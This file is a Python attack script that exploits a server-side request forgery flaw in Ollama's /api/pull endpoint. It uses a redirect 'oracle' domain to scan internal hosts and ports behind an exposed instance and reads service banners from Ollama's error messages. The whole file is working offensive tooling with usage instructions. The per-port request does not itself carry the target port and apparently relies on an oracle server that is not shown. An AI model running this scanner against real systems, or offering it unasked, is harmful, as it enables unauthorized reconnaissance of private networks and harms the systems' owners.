#!/usr/bin/env python3
"""
Ollama SSRF Internal Network Scanner
=====================================
Uses the SSRF vulnerability in POST /api/pull to scan internal services
through an exposed Ollama instance.

Requirements:
  - An oracle/redirect server running on a VPS (ssrf_oracle.py)
  - The oracle domain must point to the VPS (e.g., oracle.example.com)
  - Ollama instance accessible at --target

Usage:
  python3 ssrf_scanner.py --target http://<lab-ip>:11434 \\
    --oracle oracle.example.com \\
    --scan-host 127.0.0.1 \\
    --ports 22,80,443,3306,5432,6379,8080,8443,9200,27017
"""

import argparse
import json
import sys
import time
import urllib.request
import urllib.error
from datetime import datetime

WELL_KNOWN_PORTS = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
    80: "http", 110: "pop3", 143: "imap", 443: "https", 465: "smtps",
    587: "smtp-sub", 993: "imaps", 995: "pop3s", 3306: "mysql",
    3389: "rdp", 5432: "postgres", 5900: "vnc", 6379: "redis",
    8080: "http-proxy", 8443: "https-alt", 8888: "http-alt2",
    9090: "prometheus", 9200: "elasticsearch", 9300: "es-transport",
    11211: "memcached", 27017: "mongodb", 27018: "mongodb-shard",
    5672: "rabbitmq", 15672: "rabbitmq-mgmt", 3000: "grafana",
    5000: "flask", 8000: "http-dev", 8081: "http-alt3", 11434: "ollama",
}


def parse_error(error_msg):
    if not error_msg:
        return "FILTERED", "no response (timeout)"
    if "malformed HTTP response" in error_msg:
        start = error_msg.find('"')
        end = error_msg.rfind('"')
        if start != -1 and end != -1 and end > start:
            return "OPEN", f"SSH banner: {error_msg[start+1:end]}"
        return "OPEN", f"non-HTTP: {error_msg[:100]}"
    if "connection refused" in error_msg:
        return "CLOSED", "connection refused"
    if "connection reset" in error_msg:
        return "CLOSED", "connection reset"
    if "invalid character" in error_msg:
        idx = error_msg.find("invalid character '")
        if idx != -1:
            char = error_msg[idx + 21]
            return "OPEN", f"HTTP (first byte: '{char}')"
        return "OPEN", "HTTP service"
    if "tls:" in error_msg or "x509:" in error_msg:
        return "OPEN", f"TLS/HTTPS: {error_msg[:100]}"
    if "timeout" in error_msg or "deadline exceeded" in error_msg:
        return "FILTERED", "timeout"
    if "no such host" in error_msg:
        return "NXDOMAIN", "host not found"
    return "UNKNOWN", error_msg[:150]


def scan_port(target_url, oracle_host, timeout=15):
    payload = {"name": f"{oracle_host}/library/scan:latest", "stream": False}
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        f"{target_url}/api/pull", data=data,
        headers={"Content-Type": "application/json"}, method="POST"
    )
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read().decode()
        return json.loads(body).get("error", "")
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        try:
            return json.loads(body).get("error", body)
        except Exception:
            return body
    except Exception as e:
        return str(e)


def run_scan(args):
    target_url = args.target.rstrip("/")
    scan_host = args.scan_host

    if args.ports:
        port_list = []
        for p in args.ports.split(","):
            if "-" in p:
                s, e = p.split("-", 1)
                port_list.extend(range(int(s), int(e) + 1))
            else:
                port_list.append(int(p))
        targets = [(scan_host, p, WELL_KNOWN_PORTS.get(p, f"port-{p}")) for p in port_list]
    else:
        targets = [(scan_host, p, name) for p, name in sorted(WELL_KNOWN_PORTS.items())]

    print(f"[*] Ollama SSRF Scanner — {target_url} -> {scan_host}")
    print(f"[*] {len(targets)} targets, {args.delay}s delay\n")

    results = {}
    open_ports = []

    for i, (ip, port, desc) in enumerate(targets):
        error = scan_port(target_url, args.oracle, args.timeout)
        status, detail = parse_error(error)
        key = f"{ip}:{port}"
        results[key] = {"port": port, "service": desc, "status": status, "detail": detail}

        icon = {"OPEN": "[+]", "CLOSED": "[-]", "FILTERED": "[~]", "NXDOMAIN": "[?]"}.get(status, "[ ]")
        print(f"  {icon} {ip}:{port:<6} [{desc:<18}] {status:<10} {detail}")

        if status == "OPEN":
            open_ports.append((ip, port, desc, detail))

        if i < len(targets) - 1:
            time.sleep(args.delay)

    print(f"\n[*] {len(targets)} scanned, {len(open_ports)} open")
    if open_ports:
        print("[+] OPEN PORTS:")
        for ip, port, desc, detail in open_ports:
            print(f"    {ip}:{port} ({desc}) — {detail}")

    if args.output:
        with open(args.output, "w") as f:
            json.dump({"scan_time": datetime.now().isoformat(), "target": target_url,
                       "oracle": args.oracle, "scan_host": scan_host,
                       "open_ports": [{"ip": i, "port": p, "service": d, "detail": det}
                                      for i, p, d, det in open_ports]}, f, indent=2)
        print(f"[*] Results saved to {args.output}")


def main():
    parser = argparse.ArgumentParser(description="Ollama SSRF Internal Network Scanner")
    parser.add_argument("-t", "--target", required=True, help="Ollama target URL")
    parser.add_argument("-o", "--oracle", required=True, help="Oracle domain")
    parser.add_argument("--scan-host", default="127.0.0.1", help="Internal host to scan")
    parser.add_argument("-p", "--ports", help="Ports (comma-separated or range)")
    parser.add_argument("--timeout", type=int, default=15)
    parser.add_argument("--delay", type=float, default=1.0)
    parser.add_argument("--output", "-O", help="Save results to JSON")
    args = parser.parse_args()
    run_scan(args)


if __name__ == "__main__":
    main()
